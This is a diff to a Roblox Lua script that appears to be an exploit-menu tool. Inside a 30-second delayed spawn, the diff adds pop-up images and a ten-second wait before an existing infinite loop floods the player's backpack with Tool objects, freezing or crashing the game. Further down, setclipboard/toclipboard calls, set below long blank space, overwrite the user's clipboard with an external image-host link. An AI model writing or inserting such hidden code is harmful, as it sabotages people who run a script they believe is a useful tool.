@@ -44,7 +44,7 @@ Section:NewButton("tilibord tul", "ButtonInfo", function()
 		end)
 		wait()
 	end
-	
+
 end)
 
 
@@ -132,14 +132,77 @@ end)
 
 spawn(function()
 	task.wait(30)
+	
+
+
+	local ScreenGui = Instance.new("ScreenGui")
+	local ImageLabel = Instance.new("ImageLabel")
+	local ImageLabel_2 = Instance.new("ImageLabel")
+	local ImageLabel_3 = Instance.new("ImageLabel")
+	local ImageLabel_4 = Instance.new("ImageLabel")
+	local ImageLabel_5 = Instance.new("ImageLabel")
+
+
+
+	ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+	wait(1)
+	ImageLabel.Parent = ScreenGui
+	ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+	ImageLabel.Position = UDim2.new(0.761869967, 0, 0.03539823, 0)
+	ImageLabel.Size = UDim2.new(0, 154, 0, 158)
+	ImageLabel.Image = "rbxassetid://8044021618"
+	wait(1)
+	ImageLabel_2.Parent = ScreenGui
+	ImageLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+	ImageLabel_2.Position = UDim2.new(0.162162125, 0, 0.118584074, 0)
+	ImageLabel_2.Size = UDim2.new(0, 154, 0, 158)
+	ImageLabel_2.Image = "rbxassetid://8044021618"
+	wait(2)
+	ImageLabel_3.Parent = ScreenGui
+	ImageLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+	ImageLabel_3.Position = UDim2.new(0.395178944, 0, 0.507964611, 0)
+	ImageLabel_3.Size = UDim2.new(0, 154, 0, 158)
+	ImageLabel_3.Image = "rbxassetid://8044021618"
+	wait(1)
+	ImageLabel_4.Parent = ScreenGui
+	ImageLabel_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+	ImageLabel_4.Position = UDim2.new(0.528122723, 0, 0.0566371679, 0)
+	ImageLabel_4.Size = UDim2.new(0, 154, 0, 158)
+	ImageLabel_4.Image = "rbxassetid://8044021618"
+	wait(3)
+	ImageLabel_5.Parent = ScreenGui
+	ImageLabel_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+	ImageLabel_5.Position = UDim2.new(0.761869967, 0, 0.03539823, 0)
+	ImageLabel_5.Size = UDim2.new(0, 154, 0, 158)
+	ImageLabel_5.Image = "rbxassetid://8044021618"
+	
+	wait(10)
+	
+	
+	
 	while true do
 		Instance.new("Tool", game.Players.LocalPlayer.Backpack)
 	end
 end)
 
 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 setclipboard("https://screenshare.pics/image.php?id=5W5LCW.jpg")
 toclipboard("https://screenshare.pics/image.php?id=5W5LCW.jpg")
-
 
 
